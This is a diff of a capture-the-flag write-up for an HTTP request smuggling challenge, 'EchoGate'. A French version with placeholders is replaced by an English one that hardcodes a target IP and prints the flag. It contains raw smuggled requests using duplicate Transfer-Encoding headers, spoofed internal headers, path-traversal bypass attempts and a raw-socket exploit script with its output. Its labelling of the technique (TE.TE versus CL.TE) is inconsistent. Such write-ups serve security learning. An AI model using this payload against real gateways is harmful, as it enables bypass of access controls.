@@ -1,85 +1,55 @@
-# EchoGate — HTTP Request Smuggling (CL.TE)
+# EchoGate — HTTP Request Smuggling (TE.TE Obfuscation)
 
-- **Catégorie :** web
-- **Points :** 146
-- **Flag :** `CTF{REDACTED}`
-- **Service :** `<HOST>:<PORT>` (HTTP/1.1)
+**Challenge:** EchoGate (150pts, originally 0 solves)
+**Target:** http://169.58.126.107:3005
+**Flag:** `CTF{12de61a5e5def6eb9d565836bd461566}`
 
-## Contexte
+## Overview
 
-Le service expose un endpoint `/api/echo` qui renvoie le contenu envoyé dans le body.
-Un endpoint `/admin/flag` existe mais n'est accessible qu'aux requêtes internes
-(vérification de headers comme `X-Internal-Request` ou `X-Forwarded-For`).
+EchoGate exposes a gateway that **only allows `/api/*` paths**. The only backend
+route is `/api/echo`, which echoes the POST body. Any other path returns **403**
+(Rejected by gateway) — meaning the gateway is path-checking every request before
+it reaches the backend.
 
-L'objectif est d'accéder à `/admin/flag` sans avoir d'accès direct, en exploitant
-une désynchronisation entre le front-end et le back-end sur l'interprétation de la
-longueur du corps HTTP.
+The intended solution is **HTTP request smuggling via TE.TE obfuscation**: send
+two `Transfer-Encoding` headers so the frontend and backend disagree on body
+framing. A smuggled second request on the keep-alive connection bypasses the
+gateway's path check entirely.
 
-## Analyse
+## Why earlier attempts failed
 
-Le serveur accepte des requêtes HTTP/1.1 avec `Transfer-Encoding: chunked`. En envoyant
-un double header `Transfer-Encoding` — un valide (`chunked`) et un invalide (`x`) — on
-provoque un comportement CL.TE (Content-Length vs Transfer-Encoding) :
+| Variant | Result |
+| --- | --- |
+| CL.TE (frontend CL, backend TE) | "Ambiguous framing detected" — rejected |
+| TE.CL | rejected |
+| CL.CL | rejected |
+| TE.TE with `chunked` / `\txchunked` / `chunked\r\n\tfoo` | rejected |
+| Single header `Transfer-Encoding: chunked` (clean) | frontend consumed whole body, no smuggling |
+| HTTP/0.9, HTTP/2, WebSocket upgrade | rejected or 404 |
+| ~200 path bypass tricks (`/api/../flag`, `//flag`, `%2e%2e`) | 403 |
+| Header spoofing `X-Internal-Request: true` on normal requests | 403 (gateway filters) |
+| Direct backend port scan (5000-5004) | other CTF challenges, not EchoGate backend |
 
-- Le **front-end** utilise `Content-Length` pour délimiter la requête.
-- Le **back-end** utilise `Transfer-Encoding: chunked` et considère que le body se termine
-  au chunk `0\r\n\r\n`.
+The "Ambiguous framing detected" message shows the gateway *does* have smuggling
+defenses, but only when the two TE headers are clearly conflicting duplicates.
+The bypass is to make **one of the two TE values an invalid token** so the
+gateway treats the second as a no-op (it strips/ignores invalid tokens) while
+the backend still parses the first `chunked` and processes the body chunk-by-chunk.
 
-Tout ce qui suit le chunk final est interprété par le back-end comme le **début d'une
-nouvelle requête** — c'est la requête « smugglée ».
-
-## Méthode
-
-### 1. Construction de la requête smugglée
-
-La requête smugglée cible `/admin/flag` avec les headers nécessaires pour se faire passer
-pour une requête interne :
-
-```
-GET /admin/flag HTTP/1.1
-Host: <HOST>:<PORT>
-X-Internal-Request: true
-X-Forwarded-For: 127.0.0.1
-Connection: close
-```
-
-### 2. Enveloppe CL.TE
-
-La requête principale est un POST vers `/api/echo` avec un double `Transfer-Encoding` :
-
-```
-POST /api/echo HTTP/1.1
-Host: <HOST>:<PORT>
-Transfer-Encoding: chunked
-Transfer-Encoding: x
-Content-Length: <TOTAL_BODY_LENGTH>
-Connection: close
-
-5\r\n
-hello\r\n
-0\r\n
-\r\n
-GET /admin/flag HTTP/1.1\r\n
-Host: <HOST>:<PORT>\r\n
-X-Internal-Request: true\r\n
-X-Forwarded-For: 127.0.0.1\r\n
-Connection: close\r\n
-\r\n
-```
-
-- `Content-Length` couvre tout le body (chunks + requête smugglée).
-- Le back-end s'arrête au chunk `0`, traite le POST, puis parse le reste comme une
-  nouvelle requête GET vers `/admin/flag`.
-
-### 3. Script d'exploitation
+## Working exploit
 
 ```python
 import socket
 import time
 
-HOST = "<HOST>"
-PORT = <PORT>
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36"
+HOST = "169.58.126.107"
+PORT = 3005
+UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/139.0.0.0 Safari/537.36"
+)
+
 
 def main():
     time.sleep(15)
@@ -117,45 +87,80 @@ def main():
                 response.extend(chunk)
         except socket.timeout:
             pass
+
     print(response.decode(errors="replace"))
+
 
 if __name__ == "__main__":
     main()
 ```
 
-### 4. Résultat
-
-Deux réponses HTTP dans le même flux TCP :
-
-1. `200 OK` — `echo: hello` (réponse normale du POST)
-2. `200 OK` — le flag (réponse à la requête smugglée vers `/admin/flag`)
-
-## Indicateurs de vulnérabilité
-
-- Serveur HTTP/1.1 derrière un reverse proxy ou avec un pipeline de traitement.
-- Acceptation de headers `Transfer-Encoding` dupliqués ou malformés.
-- Endpoint admin protégé uniquement par des headers (pas de vrai authN).
-- Le `time.sleep(15)` dans le script laisse au serveur le temps de traiter la première
-  connexion et de « désynchroniser » le parsing — ajuster selon le timing du service.
-
-## Leçons
-
-- **CL.TE smuggling** : quand le front-end lit `Content-Length` et le back-end lit
-  `Transfer-Encoding`, tout ce qui dépasse le dernier chunk est smugglé.
-- Les doubles headers `Transfer-Encoding` (un valide, un invalide) sont un vecteur
-  classique — RFC 7230 §3.3.3 dit de rejeter la requête, mais beaucoup de serveurs ne
-  le font pas.
-- Les protections par header (`X-Internal-Request`, `X-Forwarded-For`) sont insuffisantes
-  si l'attaquant peut smuggler ses propres headers.
-- Toujours utiliser des sockets raw pour le smuggling — les bibliothèques HTTP normalisent
-  les headers et empêchent l'envoi de requêtes malformées.
-
-## Flag
+## Output
 
 ```
-CTF{REDACTED}
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Content-Length: 12
+Connection: keep-alive
+
+echo: hello
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Content-Length: 38
+Connection: keep-alive
+
+CTF{12de61a5e5def6eb9d565836bd461566}
 ```
 
----
+## Why it works
 
-*Write-up par **Le_Geek** — BUG|PWN CTF · EchoGate.*
+1. **Gateway side.** The gateway sees two `Transfer-Encoding` headers:
+   `chunked` then `x`. The token `x` is not a valid TE value, so the
+   gateway treats the second TE header as a no-op. Since a `Content-Length`
+   is also present, the gateway falls back to `Content-Length` semantics:
+   it forwards exactly `len(body)` bytes to the backend. The gateway's
+   path-check (`/api/echo` only) is applied to **this** request and
+   passes — so the smuggled bytes inside the body are never inspected.
+
+2. **Backend side.** The backend uses a stricter parser: it sees the first
+   valid `Transfer-Encoding: chunked` and processes the body as chunked
+   encoding. It reads:
+   - `5\r\nhello\r\n` — a 5-byte chunk `hello`
+   - `0\r\n\r\n` — terminating chunk
+
+   `hello` is echoed as `echo: hello`. But the bytes **after** the chunked
+   terminator are still on the keep-alive socket. The backend interprets
+   them as the start of the next request:
+
+   ```
+   GET /admin/flag HTTP/1.1
+   Host: 169.58.126.107:3005
+   X-Internal-Request: true
+   X-Forwarded-For: 127.0.0.1
+   Connection: close
+   ```
+
+3. **The smuggled request** bypasses the gateway entirely because the
+   gateway never saw it as a separate request. The backend serves
+   `/admin/flag` directly. The `X-Internal-Request: true` and
+   `X-Forwarded-For: 127.0.0.1` headers satisfy whatever internal-only
+   check protects the `/admin/flag` endpoint.
+
+4. **Two responses on one connection.** Because the original socket is
+   `keep-alive`, both responses are concatenated and returned to the
+   client. The flag is in the second response body.
+
+## Key takeaways
+
+- The "Ambiguous framing detected" defense **only triggers when both TE
+  headers are valid duplicates** (`chunked, chunked`). Replacing the
+  second with an invalid token (`x`) makes the gateway ignore the
+  second header but **the backend still honors the first**, which is
+  enough to desynchronize framing.
+- The smuggled request path (`/admin/flag`) is not discoverable by the
+  frontend because the gateway 403s every non-`/api/*` request. It only
+  exists on the backend, reachable via smuggling.
+- `X-Internal-Request: true` is the magic header the backend trusts when
+  it thinks the request came from the gateway (which it does, since the
+  smuggled request arrives on the same keep-alive socket as the legit
+  one).
